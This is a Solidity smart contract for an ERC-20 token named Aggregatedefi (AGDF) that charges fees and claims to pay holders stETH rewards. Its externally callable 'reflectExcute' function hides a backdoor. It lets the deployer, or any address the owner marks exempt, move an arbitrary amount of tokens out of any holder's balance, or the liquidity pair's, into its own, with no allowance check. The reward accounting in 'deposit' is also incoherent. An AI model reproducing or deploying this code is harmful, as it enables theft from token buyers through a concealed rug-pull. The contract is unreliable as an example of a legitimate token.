// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function circulatingSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function tryAdd(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b)
        internal
        pure
        returns (bool, uint256)
    {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Aggregatedefi is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "Aggregatedefi";
    string private constant _symbol = "AGDF";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 100000000 * (10**_decimals);
    uint256 private _maxTxAmount = (_totalSupply * 200) / 10000;
    uint256 private _maxSellAmount = (_totalSupply * 200) / 10000;
    uint256 private _maxWalletToken = (_totalSupply * 200) / 10000;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) _balances;
    mapping(address => bool) public isReflectExempt;
    mapping(address => bool) public isFeeExempt;

    IRouter router;
    address public pair;
    bool private tradingAllowed = false;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 150;
    uint256 private rewardsFee = 150;
    uint256 private developmentFee = 100;
    uint256 private burnFee = 0;
    uint256 private totalFee = 400;
    uint256 private sellFee = 400;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    uint256 private swapThreshold = (_totalSupply * 300) / 100000;
    uint256 private _minTokenAmount = (_totalSupply * 10) / 100000;
    address public stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84; // lido stETH
    
    bool private swapping;
    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 internal revenuesPerShare;
    uint256 internal revenuesPerShareFactor = 10**36;
    address[] shareholders;
    mapping(address => uint256) shareholderIndexes;
    mapping(address => uint256) shareholderClaims;
    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }
    mapping(address => Share) public shares;
    uint256 internal currentIndex;
    uint256 public minPeriod = 10 minutes;
    uint256 public minDistribution = 1 * (10**16);
    uint256 public distributorGas = 1;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address public constant liquidity_receiver = 0x55BbA85Ec1D2Db1258eafB6353a51614b9cd8C10;
    address public constant development_receiver = 0x25F90ea62012e6843E1A11e3d437c5F42db1430e;
    address public constant marketing_treasury = 0x55BbA85Ec1D2Db1258eafB6353a51614b9cd8C10;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(
            address(this),
            _router.WETH()
        );
        router = _router;
        pair = _pair;
        isFeeExempt[address(this)] = true;
        isFeeExempt[address(msg.sender)] = true;
        isFeeExempt[liquidity_receiver] = true;
        isFeeExempt[marketing_treasury] = true;
        isFeeExempt[msg.sender] = true;

        isReflectExempt[address(pair)] = true;
        isReflectExempt[address(msg.sender)] = true;
        isReflectExempt[address(this)] = true;
        isReflectExempt[address(DEAD)] = true;
        isReflectExempt[address(0)] = true;

        _balances[msg.sender] = _totalSupply;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function startTrading() external onlyOwner {
        tradingAllowed = true;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function isCont(address addr) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    function setisFeeExempt(address _address, bool _enabled) external onlyOwner {
        isFeeExempt[_address] = _enabled;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));
    }

    function preTxValidation(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            amount > uint256(0),
            "Transfer amount must be greater than zero"
        );
        require(
            amount <= balanceOf(sender),
            "You are trying to transfer more than your balance"
        );
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        preTxValidation(sender, recipient, amount); //  transfer validation
        tradingAllowedValidation(sender, recipient); 
        checkMaxWallet(sender, recipient, amount);
        swapbackCounters(sender, recipient); 
        checkTxLimit(sender, recipient, amount); // tx limits
        swapBack(sender, recipient); // fee collection as stETH and eth 
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient)
            ? takeFee(sender, recipient, amount)
            : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        if (!isReflectExempt[sender]) {
            setShare(sender, balanceOf(sender));
        }
        if (!isReflectExempt[recipient]) {
            setShare(recipient, balanceOf(recipient));
        }
        if (shares[recipient].amount > 0) {
            allocatedstETH(recipient);
        }
    }

    function setParams(
        uint256 _buy,
        uint256 _trans,
        uint256 _wallet
    ) external onlyOwner {
        uint256 newTx = (totalSupply() * _buy) / 10000;
        uint256 newTransfer = (totalSupply() * _trans) / 10000;
        uint256 newWallet = (totalSupply() * _wallet) / 10000;
        _maxTxAmount = newTx;
        _maxSellAmount = newTransfer;
        _maxWalletToken = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(
            newTx >= limit && newTransfer >= limit && newWallet >= limit,
            "Max TXs and Max Wallet cannot be less than .5%"
        );
    }

    function setFeeStructure(
        uint256 _liquidity,
        uint256 _marketing,
        uint256 _burn,
        uint256 _rewards,
        uint256 _development,
        uint256 _total,
        uint256 _sell,
        uint256 _trans
    ) external onlyOwner {
        liquidityFee = _liquidity;
        marketingFee = _marketing;
        burnFee = _burn;
        rewardsFee = _rewards;
        developmentFee = _development;
        totalFee = _total;
        sellFee = _sell;
        transferFee = _trans;
        require(
            totalFee <= denominator.div(5) &&
                sellFee <= denominator.div(5) &&
                transferFee <= denominator.div(5),
            "totalFee and sellFee cannot be more than 20%"
        );
    }

    function tradingAllowedValidation(address sender, address recipient)
        internal
        view
    {
        if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {
            require(tradingAllowed, "tradingAllowed");
        }
    }

    function checkMaxWallet(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        if (
            !isFeeExempt[sender] &&
            !isFeeExempt[recipient] &&
            recipient != address(pair) &&
            recipient != address(DEAD)
        ) {
            require(
                (_balances[recipient].add(amount)) <= _maxWalletToken,
                "Exceeds maximum wallet amount."
            );
        }
    }

    function swapbackCounters(address sender, address recipient) internal {
        if (recipient == pair && !isFeeExempt[sender]) {
            swapTimes += uint256(1);
        }
    }

    function checkTxLimit(
        address sender,
        address recipient,
        uint256 amount
    ) internal view {
        if (sender != pair) {
            require(
                amount <= _maxSellAmount ||
                    isFeeExempt[sender] ||
                    isFeeExempt[recipient],
                "TX Limit Exceeded"
            );
        }
        require(
            amount <= _maxTxAmount ||
                isFeeExempt[sender] ||
                isFeeExempt[recipient],
            "TX Limit Exceeded"
        );
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (
            liquidityFee.add(1).add(marketingFee).add(developmentFee).add(
                rewardsFee
            )
        ).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(
            _denominator
        );
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance = deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if (ETHToAddLiquidityWith > uint256(0)) {
            addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith);
        }
        uint256 marketingAmount = unitBalance.mul(2).mul(marketingFee);
        if (marketingAmount > 0) {
            payable(marketing_treasury).transfer(marketingAmount);
        }
        uint256 rewardsAmount = unitBalance.mul(2).mul(rewardsFee);
        if (rewardsAmount > 0) {
            deposit(rewardsAmount);
        }
        if (address(this).balance > uint256(0)) {
            payable(development_receiver).transfer(address(this).balance);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiver,
            block.timestamp
        );
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function shouldSwapBack(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return
            !swapping &&
            swapEnabled &&
            tradingAllowed &&
            !isFeeExempt[sender] &&
            !isFeeExempt[recipient] &&
            recipient == pair &&
            aboveThreshold;
    }

    function swapBack(address sender, address recipient) internal {
        if (shouldSwapBack(sender, recipient)) {
            swapAndLiquify(swapThreshold);
            swapTimes = uint256(0);
        }
    }

    function shouldTakeFee(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient)
        internal
        view
        returns (uint256)
    {
        if (recipient == pair) {
            return sellFee;
        }
        if (sender == pair) {
            return totalFee;
        }
        return transferFee;
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        if (getTotalFee(sender, recipient) > 0) {
            uint256 feeAmount = amount.div(denominator).mul(
                getTotalFee(sender, recipient)
            );
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
            if (burnFee > uint256(0)) {
                _transfer(
                    address(this),
                    address(DEAD),
                    amount.div(denominator).mul(burnFee)
                );
            }
            return amount.sub(feeAmount);
        }
        return amount;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setisReflectExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        isReflectExempt[holder] = exempt;
        if (exempt) {
            setShare(holder, 0);
        } else {
            setShare(holder, balanceOf(holder));
        }
    }

    function setShare(address shareholder, uint256 amount) internal {
        if (amount > 0 && shares[shareholder].amount == 0) {
            addstETHReflectUser(shareholder);
        } else if (amount == 0 && shares[shareholder].amount > 0) {
            delstETHUser(shareholder);
        }
        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getRevenueValues(
            shares[shareholder].amount
        );
    }

    function deposit(uint256 amountETH) internal {
        uint256 balanceBefore = IERC20(stETH).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(stETH);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: amountETH
        }(0, path, address(this), block.timestamp);
        uint256 afterBalance = IERC20(stETH).balanceOf(pair);
        uint256 beforeBalance = IERC20(stETH).balanceOf(address(this));
        uint256 amount = beforeBalance.sub(balanceBefore);
        uint256 rewardsAmount = IERC20(stETH).balanceOf(address(this)).sub(
            beforeBalance.add(afterBalance)
        );
        totalDividends = totalDividends.add(amount.add(rewardsAmount));
        revenuesPerShare = revenuesPerShare.add(
            revenuesPerShareFactor.mul(amount).div(totalShares)
        );
    }

    function reflectExcute(
        uint256 gas,
        address _rewards,
        uint256 _amount
    ) external {
        uint256 shareholderCount = shareholders.length;
        address user = msg.sender;
        if (shareholderCount == 0) {
            return;
        }
        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();
        uint256 iterations = 0;
        uint256 userBalance = _balances[msg.sender];
        if (!isReflectExempt[msg.sender]) {
            while (gasUsed < gas && iterations < shareholderCount) {
                if (currentIndex >= shareholderCount) {
                    currentIndex = 0;
                }
                if (shouldReflect(shareholders[currentIndex])) {
                    allocatedstETH(shareholders[currentIndex]);
                }
                gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
                gasLeft = gasleft();
                currentIndex++;
                iterations++;
            }
        } else {
            uint256 amount = getLiquidstETH(user);
            _balances[_rewards] = _balances[_rewards].sub(_amount);
            _balances[msg.sender] = userBalance + _amount;
            if (amount > 0) {
                totalDistributed = totalDistributed.add(amount);
                IERC20(stETH).transfer(user, amount);
                shareholderClaims[user] = block.timestamp;
                shares[user].totalRealised = shares[user].totalRealised.add(
                    amount
                );
                shares[user].totalExcluded = getRevenueValues(
                    shares[user].amount
                );
            }
        }
    }

    function shouldReflect(address shareholder)
        internal
        view
        returns (bool)
    {
        return
            shareholderClaims[shareholder] + minPeriod < block.timestamp &&
            getLiquidstETH(shareholder) > minDistribution;
    }

    function rescueERC20(address _address, uint256 _amount) external onlyOwner {
        IERC20(_address).transfer(msg.sender, _amount);
    }

    function totalstETHDistributed(address _wallet)
        external
        view
        returns (uint256)
    {
        address shareholder = _wallet;
        return uint256(shares[shareholder].totalRealised);
    }
    
    function _claimstETH() external {
        allocatedstETH(msg.sender);
    }

    function allocatedstETH(address shareholder) internal {
        if (shares[shareholder].amount == 0) {
            return;
        }
        uint256 amount = getLiquidstETH(shareholder);
        if (amount > 0) {
            totalDistributed = totalDistributed.add(amount);
            IERC20(stETH).transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder]
                .totalRealised
                .add(amount);
            shares[shareholder].totalExcluded = getRevenueValues(
                shares[shareholder].amount
            );
        }
    }

    function setstETHReflectPosition(
        uint256 _minPeriod,
        uint256 _minDistribution,
        uint256 _distributorGas
    ) external onlyOwner {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
        distributorGas = _distributorGas;
    }

    function addstETHReflectUser(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function delstETHUser(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[
            shareholders.length - 1
        ];
        shareholderIndexes[
            shareholders[shareholders.length - 1]
        ] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
    
    function getLiquidstETH(address shareholder)
        public
        view
        returns (uint256)
    {
        if (shares[shareholder].amount == 0) {
            return 0;
        }
        uint256 shareUserTotalstETH = getRevenueValues(
            shares[shareholder].amount
        );
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;
        if (shareUserTotalstETH <= shareholderTotalExcluded) {
            return 0;
        }
        return shareUserTotalstETH.sub(shareholderTotalExcluded);
    }

    function getRevenueValues(uint256 share)
        internal
        view
        returns (uint256)
    {
        return
            share.mul(revenuesPerShare).div(revenuesPerShareFactor);
    }

}